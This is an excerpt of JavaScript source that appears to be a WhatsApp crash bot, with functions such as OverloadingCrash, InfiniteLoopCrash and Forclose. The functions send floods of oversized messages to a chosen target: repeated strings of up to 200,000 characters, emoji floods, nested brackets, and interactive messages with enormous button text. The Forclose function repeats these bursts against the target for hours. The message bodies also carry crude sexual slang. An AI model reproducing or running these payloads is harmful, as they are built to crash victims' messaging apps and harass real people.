...
const ownerIds = [7464121207]; // contoh chat_id owner 
...
async function OverloadingCrash(sock, target) {
    try {
        ...
        payloads.push({
            text: rge("A", 100000) + rge("B", 100000) + rge("C", 100000)
        });
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("E", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    ...
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("F", 500)
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("G", 500)
                                    })
                                }
                            ]
                        }
...
async function InfiniteLoopCrash(sock, target) {
    try {
        ...
        for (let i = 0; i < 100; i++) {
            payloads.push({
                text: rge("H", 50000) + rge("I", 50000) + rge("J", 50000)
            });
        }
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("O", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "button_one",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("P", 500)
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("Q", 500)
                                    })
                                }
                            ]
                        }
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("W", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "button_one",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("X", 500)
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("Y", 500)
                                    })
                                }
                            ]
                        }
...
async function MixedContentCrash(sock, target) {
    try {
        ...
        payloads.push({
            text: rge("Z", 50000) + rge("🚨", 50000) + rge("✨", 50000)
        });
...
async function ExtremeCharacterCrash(sock, target) {
    try {
        ...
        payloads.push({
            text: rge("A", 200000) + rge("B", 200000) + rge("C", 200000)
        });
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("H", 40000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "button_one",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("I", 1000)
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("J", 1000)
                                    })
                                }
                            ]
                        }
...
async function NestedMessageCrash(sock, target) {
    try {
        ...
        // Payload 1: Nested messages
        payloads.push({
            text: rge("{", 50000) + rge("[", 50000) + rge("(", 50000)
        });
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("]", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("P", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
...
async function MixedContentExtremeCrash(sock, target) {
    try {
        ...
        payloads.push({
            text: rge("S", 50000) + rge("🚨", 50000) + rge("✨", 50000)
        });
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("X", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
...
async function InfiniteLoopHeavyCrash(sock, target) {
    try {
        ...
        for (let i = 0; i < 200; i++) {
            payloads.push({
                text: rge("A", 50000) + rge("B", 50000) + rge("C", 50000)
            });
        }
            ...
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        ...
                        body: {
                            text: "Ewe Ewe Ah Ah Crot" + rge("H", 20000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "button_one",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("I", 500)
                                    })
                                },
                                {
                                    name: "button_two",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: rge("J", 500)
                                    })
                                }
                            ]
                        }
...
async function Forclose(durationHours, target) {
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 18) {
        await Promise.all([
        StickerSplit(sock, target),
        StickerSplit(sock, target),
        StickerSplit(sock, target),
        StickerSplit(sock, target),
        StickerSplit(sock, target),
        await sleep(3000),
        ForceBitterSpam(sock, target),
        StickerSplit(sock, target),
        ForceBitterSpam(sock, target),
        ForceBitterSpam(sock, target),
        ForceBitterSpam(sock, target),
        await sleep(9000),
        StickForclose(sock, target),
        StickForclose(sock, target),
        StickForclose(sock, target),
        ForceComunity(sock, target),
        ForceComunity(sock, target),
        await sleep(3000),
        RFPTarsax(sock, target),
        RFPTarsax(sock, target),
        RFPTarsax(sock, target),
        ForceComunity(sock, target),
        ForceComunity(sock, target),
